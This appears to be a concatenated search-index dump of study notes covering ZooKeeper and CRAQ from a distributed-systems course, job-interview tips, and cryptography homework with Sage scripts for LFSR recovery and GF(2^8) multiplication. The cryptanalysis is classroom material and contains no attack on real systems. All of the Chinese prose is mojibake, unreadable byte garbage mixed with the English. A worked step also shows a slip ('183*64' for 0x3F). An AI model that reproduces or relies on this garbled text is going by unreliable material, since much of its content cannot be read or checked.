éœ€è¦ç­‰å¾…å“åº”çš„æœºå™¨å¢å¤šï¼Œåè€Œä¼šé™ä½æ€§èƒ½ã€‚ZooKeeper æé«˜æ€§èƒ½çš„ä¸€ä¸ªåŸºæœ¬æ€æƒ³æ˜¯ï¼š\n å°† \u0010Read è´Ÿè½½åˆ†æ•£åˆ°å„ä¸ª Replicas æœºå™¨ä¸­ï¼Œä½¿å¾—è¯»æ€§èƒ½èƒ½å¤Ÿéšæœºå™¨æ•°é‡çº¿æ€§åœ°æå‡ï¼› ä½†æ˜¯åœ¨ä¼ ç»Ÿçš„ Raft æ¶æ„ä¸‹çš„\u0010\u0010\u0010ï¼Œç›´æ¥è¯»å– Replicas ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼š  Replica may not be in majority, so may not have seen a completed write; Replica may not yet have seen a commit for a completed write; Replica may be entirely cut off from the leader;    How does ZooKeeper skin this cat?\n By changing the definition of correctness: It allows reads to yield stale data, but otherwise preserves order.  How does ZooKeeper guarantees ordering?\n Linearizable writes:  Clients only send writes to the leader; The leader chooses an order (numbered by zxid) responses to client; Leader must preserve client write order (zxid) across leader failure, Replicas must enforce \u0026ldquo;client\u0026rsquo;s reads never go backwards in zxid order\u0026rdquo;;   FIFO client order:  Client\u0026rsquo;s successive reads execute at non-decreasing points in the order. Each read request will carry previous zxid write order; Server may block a client\u0026rsquo;s read to wait for previous write, or sync; (If the most recent zxid that replica sees happens before the zxid client assign)    ç®€å•åœ°è¯´ï¼ŒZooKeeper é€šè¿‡ä»¥ä¸‹æ–¹å¼æ˜¾è‘—æé«˜äº†è¯»æ€§èƒ½ï¼š\n ä¸¢å¤±â€œè¯»â€çš„ä¸€è‡´æ€§ï¼Œä½†æ˜¯ä¿è¯äº†å•å®¢æˆ·ç«¯â€œè¯»å†™â€ä¸€è‡´æ€§ï¼ˆä¹Ÿå°±æ˜¯è¯´å¦‚æœæ˜¯æˆ‘ä¹‹å‰â€œå†™â€çš„å†…å®¹ï¼Œæˆ‘ä¸€å®šå¯ä»¥â€œè¯»â€åˆ°ï¼‰ï¼› è¿™ä¸€ä¸€è‡´æ€§çš„æŸå¤±å…¶å®æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå› ä¸ºåœ¨å¤§éƒ¨åˆ†çš„ç³»ç»Ÿä¸­ï¼Œæˆ‘ä¸€èˆ¬åªå…³å¿ƒè‡ªå·±çš„å†…å®¹ï¼›  Other performance tricks:\n Client can send async writes to leader; Leader batches up many requests to reduce net and disk-write overhead; Fuzzy snapshots (and idempotent updates) so snapshot doesn\u0026rsquo;t stop writes;  æ€§èƒ½åˆ†æï¼š\n é«˜â€œè¯»â€ååï¼šâ€œè¯»â€æ€§èƒ½éšæœºå™¨æ•°é‡å¢åŠ è€Œå¢åŠ ï¼› ä½â€œå†™â€ååï¼šâ€œå†™â€æ€§èƒ½éšæœºå™¨æ•°é‡å¢åŠ è€Œé™ä½ï¼ˆ21000 æ¬¡å†™/ç§’ï¼‰ï¼›  General-purpose Coordination Service #  API #  ZooKeeper API Overviewï¼š\n States: A file-system-like tree of znodes consist of: file names/file content/directories/path names/version number; Types of znodes: Regular, ephemeral, sequential;  Operations on znodes:\ncreate(path, data, flags) # Only first create indicates success delete(path, version) # delete znode if znode(path).version = version exists(path, watch) # set watch=true, client will receive notification if path is later created/deleted getData(path, watch) # same as above setData(path, data, version) # only set data if znode(path).version = version getChildren(path, watch) # get all children node, example: /x/y/z is a child node of /x/y/ sync() # sync then read, ensures writes before sync are visible to same client\u0026#39;s read Example #  Example1: Increment a number stored in ZooKeeper znode:\n  éœ€è¦è€ƒè™‘çš„æƒ…å†µï¼šread return stale data; another client concurrently writes valueã€‚pseudocodeï¼š\nwhile true: x, v := getData(\u0026#34;f\u0026#34;) if setData(x + 1, version=v): break   Example2: Simple Locks:\n  Pseudocode:\nacquire(): while true: if create(\u0026#34;lf\u0026#34;, ephemeral=true): return success if exists(\u0026#34;lf\u0026#34;, watch=true): wait for notification release(): (voluntarily or session timeout) delete(\u0026#34;lf\u0026#34;)   Example3: Locks without Herd Effect:\n  ä¸Šé¢ç®€å•é”çš„é—®é¢˜ï¼šå½“å­˜åœ¨å¤§é‡å®¢æˆ·ç«¯ç«äº‰åŒä¸€ä¸ªé”èµ„æºæ—¶ï¼Œä¼šå¯¼è‡´é”ç«äº‰é—®é¢˜ï¼šæ¯æ¬¡é”çš„é‡Šæ”¾éƒ½æœ‰å¤§é‡å®¢æˆ·ç«¯å‘èµ·ç«äº‰è¯·æ±‚ï¼Œä½†æ˜¯å®é™…å´åªæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯å¾—åˆ°äº†é”èµ„æºï¼›\n  Acquire Pseudocode:\ncreate a \u0026#34;sequential\u0026#34; file while true: list files if no lower-numbered: return lock is acquired! if exists(next-lower-numbered, watch=true): wait for event...   è¿™ç±»ä½¿ç”¨ ephemeral æˆ– sequential çš„é”è¢«ç§°ä¸º Soft Lockï¼Œå› ä¸ºåœ¨å®¢æˆ·ç«¯é•¿æ—¶é—´æœªå“åº”æ—¶ï¼ŒZooKeeper ä¼šä¸»åŠ¨åˆ é™¤æ–‡ä»¶ï¼Œå®ƒé€‚ç”¨äºå¯é‡å¤è´¡çŒ®é—®é¢˜ï¼ˆè®¡ç®—ä¸¤æ¬¡æ˜¯å¯ä»¥è¢«æ¥å—çš„ï¼‰ã€‚\nå¦‚æœè¦ä½¿ç”¨åŸå­é”ï¼Œåº”è¯¥ä½¿ç”¨ ready æ–‡ä»¶æ‰§è¡Œæœ€å°äº‹åŠ¡ï¼ˆåˆ é™¤åå†æ·»åŠ è¡¨ç¤ºæ‰§è¡Œç»“æŸï¼‰ã€‚\nMore #  ZooKeeper is a successful design.\nTopics not covered:\n Persistence; Details of batching and pipelining for performance; Fuzzy snapshots; Idempotent operations; Duplicate client request detection;  "},{"id":248,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/8.craq/","title":"8. Craq","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":"CRAQ #  Chain Replication (CR) #  What\u0026rsquo;s Chain Replication?\n ç³»ç»Ÿæ„æˆï¼šA list of servers, with a \u0026ldquo;head\u0026rdquo; and a \u0026ldquo;tail\u0026rdquo;; å†™ï¼šClient sends to Head, forward \u0026ldquo;write\u0026rdquo; till Tail, Tail responses to Client; è¯»ï¼šClient sends to Tail, Tail response.  ç›¸å¯¹äº Raftï¼ŒCR çš„ä¼˜ç‚¹ï¼Ÿ\n ç›¸å¯¹äº Leader å¤„ç†æ‰€æœ‰è¯·æ±‚ï¼Œå°†è¯·æ±‚åˆ†æ•£åˆ° Headã€Tail èƒ½å¤Ÿæå‡æœåŠ¡ååé‡ï¼› Raft è¿›è¡Œå†™æ—¶éœ€è¦å‘é€è¯·æ±‚åˆ°æ‰€æœ‰ Replicasï¼Œç„¶åç­‰å¾… 1/2 çš„å“åº”ï¼ŒCR åˆ™åªéœ€è¦å°†è¯·æ±‚ä¼ é€’åˆ°åç»§èŠ‚ç‚¹ï¼Œæå‡äº†å†™æ€§èƒ½çš„ååé‡ï¼› CR çš„å†™æ“ä½œåªéœ€è¦ä¸€ä¸ªæœåŠ¡å™¨çš„ä»‹å…¥ï¼› é”™è¯¯æ¢å¤çš„æµç¨‹æ›´åŠ ç®€å•ï¼ˆç›¸å½“äºåœ¨é“¾è¡¨ä¸­åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹ï¼‰ï¼›  Chain Replication with Apportioned Queries (CRAQ) #  ç±»ä¼¼äºåœ¨ ZooKeeper è®¾è®¡ä¸­çš„æ€è€ƒï¼Œå¯ä»¥å°† Read çš„å‹åŠ›åˆ†æ•£åˆ°å„ä¸ªä¸åŒçš„ Replicas ä¸­ã€‚CRAQ æ˜¯ä¸€ä¸ªåŸºäº CRã€å¹¶ä¸”å°† Read åˆ†æ•£åˆ°å„ä¸ªèŠ‚ç‚¹ã€ä¸”æ»¡è¶³ Linearizable æ€§è´¨çš„åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡ã€‚\nHow does CRAQ support linearizable reads from any replica in the chain?\n ç³»ç»Ÿæ„æˆï¼šEach replica stores a list of versions per object; å†™ï¼šEach Replicas create new dirty version as write pass through, Tail creates clean version, and ACK it back along to Head; è¯»ï¼šClient sends to any node:  If latest version is clean, reply with that; If latest version is dirty, ask tail for latest version number.    CRAQ limitation?\n  If a node isn\u0026rsquo;t reachable, CRAQ must wait, so not immediately fault-tolerant in the way that ZK and Raft are.\n  Split brain problem makes us can\u0026rsquo;t take over the Head immediately.\n  "},{"id":249,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/9.aurora/","title":"9. Aurora","section":"åˆ†å¸ƒå¼ç³»ç»Ÿ","content":"Amazon Aurora #  "},{"id":250,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%89%91%E6%8C%87offer/1.%E9%9D%A2%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B/","title":"1.é¢è¯•çš„æµç¨‹","section":"å‰‘æŒ‡ Offer","content":"é¢è¯•çš„ä¸‰ä¸ªç¯èŠ‚ #  è¡Œä¸ºé¢è¯•ç¯èŠ‚ï¼šç®€å•çš„è‡ªæˆ‘ä»‹ç»ã€‚\n åº”è˜è€…çš„é¡¹ç›®ç»å†ï¼šå»ºè®®ç”¨ STAR æ¨¡å‹å»æè¿°è‡ªå·±çš„æ¯ä¸€ä¸ªé¡¹ç›®ç»å†ã€‚  Situation: ç®€çŸ­çš„é¡¹ç›®èƒŒæ™¯ï¼› Task: è‡ªå·±å®Œæˆçš„ä»»åŠ¡ï¼› Action: ä¸ºäº†å®Œæˆä»»åŠ¡ï¼Œè‡ªå·±åšäº†å“ªäº›å·¥ä½œï¼› Result: è‡ªå·±çš„è´¡çŒ®ï¼›   åº”è˜è€…æŒæ¡çš„æŠ€èƒ½ï¼šæ³¨æ„åŒºåˆ†â€œäº†è§£â€ã€â€œç†Ÿæ‚‰â€ã€â€œç²¾é€šâ€ï¼› å›ç­”ä¸ºä»€ä¹ˆè·³æ§½ï¼šä¸è¦æŠ±æ€¨ï¼Œä¹Ÿä¸è¦æµéœ²å‡ºè´Ÿé¢çš„æƒ…ç»ªï¼›  æŠ€æœ¯é¢è¯•ç¯èŠ‚ï¼šé¢è¯•çš„é‡å¤´æˆï¼Œå¯¹é¢è¯•ç»“æœèµ·å†³å®šæ€§ä½œç”¨ï¼Œæ€»ä½“æ¥è¯´å°±å…³æ³¨åº”è˜è€…çš„ 5 ç§ç´ è´¨ï¼š\n åŸºç¡€çŸ¥è¯†æ‰å®å…¨é¢ï¼ŒåŒ…æ‹¬ç¼–ç¨‹è¯­è¨€ã€æ•°æ®ç»“æ„ã€ç®—æ³•ç­‰ï¼› èƒ½å†™å‡ºæ­£ç¡®çš„ã€å®Œæ•´çš„ã€é²æ£’çš„é«˜è´¨é‡ä»£ç ï¼› èƒ½æ€è·¯æ¸…æ™°åœ°åˆ†æå¹¶è§£å†³å¤æ‚çš„é—®é¢˜ï¼› èƒ½å¤Ÿä»æ—¶é—´ã€ç©ºé—´å¤æ‚åº¦ä¸¤ä¸ªæ–¹é¢ä¼˜åŒ–ç®—æ³•çš„æ•ˆç‡ï¼› å…·å¤‡ä¼˜ç§€çš„ç»¼åˆèƒ½åŠ›ï¼šåŒ…æ‹¬é—®é¢˜æ²Ÿé€šèƒ½åŠ›ã€å­¦ä¹ èƒ½åŠ›ã€å‘æ•£æ€§æ€ç»´èƒ½åŠ›ç­‰ï¼›  åº”è˜è€…æé—®ç¯èŠ‚ï¼Œåœ¨ç»“æŸé¢è¯•çš„å‰ 5-10 åˆ†é’Ÿï¼Œé¢è¯•å®˜ä¼šç»™åº”è˜è€…å‡ ä¸ªé—®é¢˜ï¼Œåº”è˜è€…é—®é¢˜çš„è´¨é‡ä¹Ÿä¼šå¯¹é¢è¯•ç»“æœæœ‰ä¸€å®šå½±å“ã€‚\n"},{"id":251,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%89%91%E6%8C%87offer/2.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"2.åŸºç¡€çŸ¥è¯†","section":"å‰‘æŒ‡ Offer","content":"åŸºç¡€çŸ¥è¯† #  ç¼–ç¨‹è¯­è¨€ #  æ•°æ®ç»“æ„ #  ç®—æ³•å’Œæ•°æ®æ“ä½œ #  "},{"id":252,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework1/","title":"Homework1","section":"å¯†ç å­¦","content":"Chapter2 #  ç¬¬å…­é¢˜ #  è¯ä¸å¤šè¯´ç›´æ¥ä¸Šè„šæœ¬ï¼š\n#!/usr/bin/env python2 # coding=utf-8 from sage.all import *   class Crack:  cipher = \u0026#34;1010110110\u0026#34;  plain = \u0026#34;0100010001\u0026#34;  order = 3  def __init__(self):  mapper = lambda (a,b):GF(2)(int(a)^int(b))  self.stream = map(mapper, [(self.cipher[i], self.plain[i]) for i in range(10)])   def crack_by_matrix(self):  \u0026#34;\u0026#34;\u0026#34; æ—¶é—´å¤æ‚åº¦ O(n^3) :return: è¿”å›ä¸€ä¸ªçŠ¶æ€è½¬ç§»çŸ©é˜µ \u0026#34;\u0026#34;\u0026#34;  S0 = Matrix([self.stream[i :i+5] for i in range(5)])  S1 = Matrix([self.stream[i+1:i+6] for i in range(5)])  rank1, rank2 = S0.rank(), S1.rank()  assert (rank1 == rank2) and (self.order == rank1)   S0 = Matrix([self.stream[i :i+3] for i in range(3)])  S1 = Matrix([self.stream[i+1:i+4] for i in range(3)])  return S0.solve_right(S1)   def crack_by_bm(self):  \u0026#34;\u0026#34;\u0026#34; æ—¶é—´å¤æ‚åº¦ O(n^2) :return: è¿”å›ä¸€ä¸ª lfsr çš„ç‰¹å¾å¤šé¡¹å¼ \u0026#34;\u0026#34;\u0026#34;  # todo: è¿™é‡Œç›´æ¥è°ƒç”¨äº† sagemath çš„ç³»ç»Ÿ api  # è¿™ä¸ª API å¥½åƒæœ‰ä¸€äº›é—®é¢˜ï¼Œåæ¥è¢«æ”¾å¼ƒäº†ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æ˜¯æ­£å¸¸çš„  from sage.matrix.berlekamp_massey import berlekamp_massey  return berlekamp_massey(self.stream)   if __name__ == \u0026#34;__main__\u0026#34;:  c = Crack()  print \u0026#34;è½¬ç§»çŸ©é˜µï¼š\\n\u0026#34;, c.crack_by_matrix()  print \u0026#34;\\nç‰¹å¾å¤šé¡¹å¼ï¼š\\n\u0026#34;, c.crack_by_bm() ç”¨ sage ç‰ˆæœ¬çš„ python2 è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œå¯ä»¥å¾—åˆ°ï¼š\n$ python2 crack-6.py è½¬ç§»çŸ©é˜µï¼š [0 0 1] [1 0 0] [0 1 1]  ç‰¹å¾å¤šé¡¹å¼ï¼š x^3 + x^2 + 1 ç¬¬å…«é¢˜ #  æˆ‘è§‰å¾—è¿™ä¸ªé¢˜ç›®çš„ bk åºåˆ—æ˜¯æœ‰é—®é¢˜çš„ï¼š\nsage: berlekamp_massey([GF(2)(int(c)) for c in \u0026#34;001011011011000001011011011000\u0026#34;]) x^15 + 1 è¿™ä¹Ÿå°±æ˜¯è¯´èƒ½å¤Ÿæ„é€  bk çš„æœ€å°å¤šé¡¹å¼æ˜¯ $$x^{15} + 1$$ï¼Œè¿™å¾ˆæ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªå››çº§åºåˆ—ï¼š\n  è™½ç„¶ bk çš„å‘¨æœŸç­‰åŒäºä¸€ä¸ª 4 çº§ m-sequence çš„å‘¨æœŸï¼Œ\n  å®ƒå¹¶ä¸æ˜¯ m-sequenceï¼Œå®ƒçš„ç‰¹å¾å¤šé¡¹å¼ä¹Ÿéå¸¸å¥‡æ€ªã€‚\n  è¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½ç”¨ç©·ä¸¾æ³•æ±‚ä»–çš„å‘¨æœŸï¼Œä½¿ç”¨å…¬å¼ $$(2^n - 1)(2^m - 1)$$ æ˜¯é”™è¯¯çš„ã€‚\n  è¯ä¸å¤šè¯´ä¸Šä»£ç ï¼ˆç¬¬å…­é¢˜ä¸­çš„æŠ€å·§å·²ç»è¢«å°è£…ï¼šshesl-cryptoï¼‰ï¼š\n#!/usr/bin/env python2 from sage.all import * from sheslcrypto.LFSR import MatrixCrackLfsr  class Crack:  ak = [GF(2)(c) for c in \u0026#34;11101001110100\u0026#34;]  bk = [GF(2)(c) for c in \u0026#34;001011011011000001011011011000\u0026#34;]  def __init__(self):  crackak = MatrixCrackLfsr(self.ak)  self.Ma = crackak.crack_by_matrix()  crackbk = MatrixCrackLfsr(self.bk)  self.Mb = crackbk.crack_by_matrix()  self.ck = []   def calculate_nexta(self):  vector_a = vector(self.ak[-self.Ma.rank():])  next_a = vector_a * self.Ma  self.ak.append( GF(2)(next_a[-1]) )   def calculate_nextb(self):  vector_b = vector(self.bk[-self.Mb.rank():])  next_b = vector_b * self.Mb  self.bk.append( GF(2)(next_b[-1]) )   def JK_calculate_nextc(self):  index = len(self.ck)  if index == len(self.ak): self.calculate_nexta()  if index == len(self.bk): self.calculate_nextb()  a,b = self.ak[index], self.bk[index]  self.ck.append(  a if (index == 0) else ( GF(2)((a + b + 1) * self.ck[index - 1] + a) )  )   def reach_period(self):  l = len(self.ck)  return self.ck[:l/2] == self.ck[l/2:]   def crack_JK_c(self):  for _ in range( max(self.Ma.rank(), self.Mb.rank()) ):  self.JK_calculate_nextc()   while True:  self.JK_calculate_nextc()  if self.reach_period():  break  return self.ck, len(self.ck)/2   if __name__ == \u0026#34;__main__\u0026#34;:  c = Crack()  print c.crack_JK_c() ç»“æœå¦‚ä¸‹ï¼š\n$ python crack-8.py ([1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1], 105) å‘¨æœŸæ˜¯ 105ï¼Œè™½ç„¶å’Œå…¬å¼ç»“æœä¸€æ ·ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½ä½¿ç”¨å…¬å¼ã€‚\nä¾‹ 2-8 #   å®šç† 2-7: GF(2) ä¸Šçš„ n é•¿ m-sequence {ai} åº”è¯¥æ»¡è¶³ä¸‹é¢çš„ä¸‰ä¸ªæ¡ä»¶ï¼š\n åœ¨ä¸€ä¸ªå‘¨æœŸå†…ï¼Œ0ã€1 å‡ºç°çš„æ¬¡æ•°åˆ†åˆ«æ˜¯ $$2^{n-1} - 1$$ å’Œ $$2^{n - 1}$$ï¼› åœ¨ä¸€ä¸ªå‘¨æœŸå†…ï¼Œæ€»æ¸¸ç¨‹æ•°ä¸º $$2^{n-1}$$ï¼›å¯¹é•¿ä¸º $$i (1 \\le i \\le n-1)$$ çš„æ¸¸ç¨‹æœ‰ $$2^{n-1-i}$$ ä¸ªï¼Œ0ã€1 å„åŠï¼› $${a_i}$$ çš„è‡ªç›¸å…³å‡½æ•°ä¸º $$\\displaystyle R(\\tau) = \\begin{cases} 1, \u0026amp; \\tau = 0 \\\\displaystyle -\\frac{1}{2^n - 1}, \u0026amp; 0 \u0026lt; \\tau \\le 2^n - 2 \\end{cases}$$   å¯¹äºä¾‹ 2-8ï¼Œå…¶ç­‰ä»·äº $$f_1 = 1 + x +x^3, f_2 = 1 + x^2 + x^3$$ è¿™æ ·ä¸¤ä¸ªå¤šé¡¹å¼ï¼Œæ„æˆä¸€ä¸ªé’Ÿæ§åºåˆ—ç”Ÿæˆå™¨ï¼Œç°åœ¨æˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„å®šç† 2-7 è¯æ˜å®ƒæ˜¯ä¸æ˜¯ä¸€ä¸ª m åºåˆ—ã€‚ä»–ä»¬çš„è½¬ç§»çŸ©é˜µæ˜¯å¾ˆæ˜¾ç„¶çš„ã€‚\nè¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šä»£ç ï¼š\n#!/usr/bin/env python2 from sage.all import *  class ClockSequence:  Ta = Matrix(GF(2),[ [0, 0, 1],  [1, 0, 1],  [0, 1, 0]])  Tb = Matrix(GF(2),[ [0, 0, 1],  [1, 0, 0],  [0, 1, 1]])   def __init__(self):  self.a = vector(GF(2), [1, 1, 1])  self.b = vector(GF(2), [1, 1, 1])   def __iter__(self):  return self   def next(self):  c = self.b[0]  if self.a[0] == 1:  self.b = self.b * self.Tb  self.a = self.a * self.Ta  return c   if __name__ == \u0026#34;__main__\u0026#34;:  cs = ClockSequence()  cs_iter = iter(cs)  lst = [next(cs_iter) for _ in range(49)]  print(lst.count(1), lst.count(0)) è¿è¡Œå®ƒå°±å¯ä»¥å‘ç°ï¼š\n(sage-sh) $ python test-2-8.py (28, 21) ä»–ä»¬çš„ 0ã€1 æ•°é‡å·®äº†å¾ˆå¤šã€‚\n"},{"id":253,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework2/","title":"Homework2","section":"å¯†ç å­¦","content":"ç¬¬äºŒæ¬¡ä½œä¸š #  ç¬¬ä¸€é¢˜ #   åœ¨ $$GF(2^8)$$ ä¸­ï¼Œå–æ¨¡å¤šé¡¹å¼ $$m(x) = x^8 + x^4 + x^3 + x + 1$$ï¼Œè®¡ç®—ä¸‹é¢çš„ç§¯ï¼š\n 0xB7 * 0x3F 0x11 * 0xFF   æˆ‘ä»¬æŠŠä¸¤é¢˜ä¸€èµ·åšï¼Œé¦–å…ˆè½¬åŒ–ä¸ºå¤šé¡¹å¼ï¼š\n $$183 = x^7 + x^5 + x^4 + x^2 + x + 1$$ $$63 = x^5 + x^4 + x^3 + x^2 + x + 1$$ $$17 = x^4 + 1$$ $$255 = x^7 + x^6 + x^5 + x^4 + x^3 + x^2 + x + 1$$  ç„¶åæˆ‘ä»¬åœ¨ $$\\Z_2$$ çš„å¤šé¡¹å¼ç¯ä¸Šï¼Œåšå¤šé¡¹å¼ä¹˜æ³•ï¼š\n  $$183*64 = x^{12} + x^{11} + x^9 + x^8 + x^5 + x^3 + x^2 + 1$$\n  $$17 * 255 = x^{11} + x^{10} + x^9 + x^8 + x^3 + x^2 + x + 1$$\n  ç„¶åæˆ‘ä»¬åœ¨ m(x) ä¸Šå–æ¨¡ï¼š\n $$183 * 64 \\equiv x^6 + x^5 + x^4 + x + 1 \\pmod{m(x)}$$ $$17 * 255 \\equiv x^7 + x^4 + x^2 + x \\pmod{m(x)}$$  ç„¶åå°±å¯ä»¥å°†è¿™ä¸¤ä¸ªå¤šé¡¹å¼è½¬åŒ–æˆæ•´æ•°çš„è¡¨ç¤ºï¼š\n $$x^6 + x^5 + x^4 + x + 1 = 115$$ $$x^7 + x^4 + x^2 + x = 150$$  ç¬¬äºŒé¢˜ #   è®¾ $$a(x) = 0x1Bx^3 + 0x03x^2 + 0xDD*x + 0xA1$$ï¼Œä¸ $$b(x) = 0xAC * x^3 + 0xF0 * x + 0x2D$$ï¼Œä¸ºç³»æ•°åœ¨ $$GF(2^8)$$ ä¸Šçš„ä¸¤ä¸ªå¤šé¡¹å¼ï¼Œè®¡ç®— $$a(x) \\otimes b(x) \\pmod{x^4 + 1}$$\n ç»™å‡ºä¸¤ä¸ªå‡è®¾\n è®¾ç³»æ•°å®šä¹‰åœ¨æ•´æ•°æ¨¡ç¯ä¸Šçš„å¤šé¡¹å¼ä¸º Zï¼Œ å®šä¹‰åœ¨æœ‰é™åŸŸ $$GF(2^8)$$ çš„å¤šé¡¹å¼ä¸º Pï¼Œè®¾ $$GF(2^8)$$ ä¸Šçš„å…ƒç´ ç”¨ c è¡¨ç¤ºã€‚ç”±äºé¢˜ç›®ä¸­æœªæŒ‡å®šæ¨¡å¤šé¡¹å¼ï¼Œæˆ‘ä»¬è®¤ä¸ºå®ƒæ˜¯ä½¿ç”¨çš„ Rijndael çš„å¤šé¡¹å¼ï¼š$$x^8 + x^4 + x^3 + x + 1$$  æˆ‘ä»¬è®¤ä¸ºé¢˜è®¾ä¸­çš„ä¸¤ä¸ªå¤šé¡¹å¼æ˜¯å®šä¹‰åœ¨ Z ä¸Šï¼Œæˆ‘ä»¬å…ˆæŠŠå®ƒä»¬è½¬åŒ–ä¸º P ä¸Šï¼š\n $$a(x) = \\begin{bmatrix} 1b \u0026amp;* x^{3}\\3 \u0026amp;* x^{2}\\dd \u0026amp;* x^{1}\\a1 \u0026amp;* x^{0} \\end{bmatrix} = \\begin{bmatrix} (c^4 + c^3 + c + 1) \u0026amp;* x^{3}\\(c + 1) \u0026amp;* x^{2}\\(c^7 + c^6 + c^4 + c^3 + c^2 + 1) \u0026amp;* x^{1}\\(c^7 + c^5 + 1) \u0026amp;* x^{0} \\end{bmatrix}$$ $$b(x) = \\begin{bmatrix} ac \u0026amp;* x^{3}\\0 \u0026amp;* x^{2}\\f0 \u0026amp;* x^{1}\\2d \u0026amp;* x^{0} \\end{bmatrix} = \\begin{bmatrix} (c^7 + c^5 + c^3 + c^2) \u0026amp;* x^{3}\\(0) \u0026amp;* x^{2}\\(c^7 + c^6 + c^5 + c^4) \u0026amp;* x^{1}\\(c^5 + c^3 + c^2 + 1) \u0026amp;* x^{0} \\end{bmatrix}$$  æˆ‘ä»¬æ³¨æ„åˆ° a(x) ä¸ b(x) çš„ä¹˜æ³•æœ‰é™åŸŸï¼Œå®šä¹‰åœ¨æ¨¡ $$x^4 + 1$$ ä¸Šï¼Œè¿™æ„å‘³ç€ $$x^j \\equiv x^{j \\pmod{4}}\\pmod{x^4 + 1}$$ã€‚\nå¦‚æœæˆ‘ä»¬è®¾ $$c(x) = c_3* x^3 + c_2 * x^2 + c_1 x^1 + c_0\\equiv a(x) \\otimes b(x) \\pmod{x^4 + 1}$$ï¼Œåˆ™å¯¹äº c(x)ï¼Œæˆ‘ä»¬çŸ¥é“ï¼š\n $$\\begin{bmatrix} c_{0}\\c_{1}\\c_{2}\\c_{3} \\end{bmatrix} = \\begin{bmatrix} a_{0} \u0026amp; a_{3} \u0026amp; a_{2} \u0026amp; a_{1}\\a_{1} \u0026amp; a_{0} \u0026amp; a_{3} \u0026amp; a_{2}\\a_{2} \u0026amp; a_{1} \u0026amp; a_{0} \u0026amp; a_{3}\\a_{3} \u0026amp; a_{2} \u0026amp; a_{1} \u0026amp; a_{0} \\end{bmatrix} * \\begin{bmatrix} b_{0}\\b_{1}\\b_{2}\\b_{3} \\end{bmatrix}$$  äºæ˜¯æˆ‘ä»¬ç»è¿‡ä¸€äº›è®¡ç®—å¯ä»¥å¾—åˆ° c(x)ï¼š\n $$c(x) = \\begin{bmatrix} (c^6 + c^5 + c^4 + c) \u0026amp;* x^{3}\\(c^4 + c) \u0026amp;* x^{2}\\(c^6 + c^4 + c^3 + c) \u0026amp;* x^{1}\\(c^4 + c^3) \u0026amp;* x^{0} \\end{bmatrix} = \\begin{bmatrix} 72 \u0026amp;* x^{3}\\12 \u0026amp;* x^{2}\\5a \u0026amp;* x^{1}\\18 \u0026amp;* x^{0} \\end{bmatrix}$$  "},{"id":254,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/script2/","title":"Script2","section":"å¯†ç å­¦","content":"ç¬¬äºŒæ¬¡ä½œä¸š #  ç¬¬ä¸€é¢˜ #   åœ¨ $$GF(2^8)$$ ä¸­ï¼Œå–æ¨¡å¤šé¡¹å¼ $$m(x) = x^8 + x^4 + x^3 + x + 1$$ï¼Œè®¡ç®—ä¸‹é¢çš„ç§¯ï¼š\n 0xB7 * 0x3F 0x11 * 0xFF   #!/usr/bin/env python2 from sage.all import *  class Solve:  def __init__(self):  x = var(\u0026#39;x\u0026#39;)  self.FF = GF(2 ** 8, name=\u0026#39;x\u0026#39;, modulus=x**8 + x**4 + x**3 + x + 1)  self.l1, self.r1 = self.FF.fetch_int(0xb7), self.FF.fetch_int(0x3f)  self.l2, self.r2 = 